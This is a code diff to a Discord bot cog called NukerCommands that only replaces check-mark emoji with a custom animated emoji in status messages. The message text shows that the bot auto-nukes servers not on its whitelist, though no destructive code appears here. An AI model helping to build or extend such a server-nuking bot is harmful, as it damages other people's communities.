@@ -935,7 +935,7 @@ class NukerCommands(commands.Cog):
             
             embed.add_field(
                 name="📊 PROTECTION DETAILS",
-                value=f"• Type: {whitelist_type}\n• Auto-Nuke: ❌ DISABLED\n• Bot Actions: ✅ ALLOWED\n• Server Safety: ✅ GUARANTEED",
+                value=f"• Type: {whitelist_type}\n• Auto-Nuke: ❌ DISABLED\n• Bot Actions: <a:emoji_1:1430081383757512785> ALLOWED\n• Server Safety: <a:emoji_1:1430081383757512785> GUARANTEED",
                 inline=False
             )
             
@@ -992,7 +992,7 @@ class NukerCommands(commands.Cog):
                 details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔒 PERMANENT\n• Removal: ❌ NOT ALLOWED"
             else:
                 status = "<a:emoji_1:1430081383757512785> **DYNAMIC WHITELIST**"
-                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔧 DYNAMIC\n• Removal: ✅ ALLOWED"
+                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔧 DYNAMIC\n• Removal: <a:emoji_1:1430081383757512785> ALLOWED"
         else:
             status = "❌ **NOT WHITELISTED**"
             details = "• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
@@ -1049,7 +1049,7 @@ class NukerCommands(commands.Cog):
             )
             embed.add_field(
                 name="🔧 PROTECTION ACTIVE",
-                value=f"• Server ID: `{server_id}`\n• Status: ✅ SAFE\n• Type: 🔧 DYNAMIC\n• Auto-Nuke: ❌ DISABLED",
+                value=f"• Server ID: `{server_id}`\n• Status: <a:emoji_1:1430081383757512785> SAFE\n• Type: 🔧 DYNAMIC\n• Auto-Nuke: ❌ DISABLED",
                 inline=False
             )
             embed.set_footer(text="Digamber Protection System • Server Secured")
@@ -1089,7 +1089,7 @@ class NukerCommands(commands.Cog):
             )
             embed.add_field(
                 name="🚨 WARNING",
-                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: ✅ ENABLED\n• Protection: 🛡️ DISABLED",
+                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Protection: 🛡️ DISABLED",
                 inline=False
             )
             embed.set_footer(text="Digamber Protection System • Protection Disabled")
@@ -1217,13 +1217,13 @@ class NukerCommands(commands.Cog):
         
         embed.add_field(
             name="📊 SERVERS",
-            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{total_servers - protected}`\n• **Admin Panel:** ✅ ACTIVE",
+            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{total_servers - protected}`\n• **Admin Panel:** <a:emoji_1:1430081383757512785> ACTIVE",
             inline=False
         )
         
         embed.add_field(
             name="⚡ SYSTEM",
-            value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** ✅ ACTIVE\n• **Status Updates:** ✅ ACTIVE\n• **Rate Limit:** ✅ OPTIMIZED",
+            value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Status Updates:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Rate Limit:** <a:emoji_1:1430081383757512785> OPTIMIZED",
             inline=False
         )
         
